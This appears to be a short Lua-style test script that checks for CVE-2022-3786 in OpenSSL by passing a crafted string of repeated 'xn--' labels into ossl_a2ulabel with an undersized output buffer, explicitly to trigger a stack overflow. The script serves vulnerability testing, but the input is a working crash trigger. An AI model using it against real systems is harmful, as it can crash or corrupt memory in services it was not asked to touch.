print(" [*] testing for CVE-2022-3786")

-- Input arguments:
teststring = "a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--.xn--"
out = calloc(1,16)
outlen = calloc(1,2)
memset(outlen,0x10,1)

-- Trigger the stack overflow:
res = ossl_a2ulabel(teststring, out, outlen)

if res == 0 then print(" [*] Not vulnerable to CVE-2022-3786") end
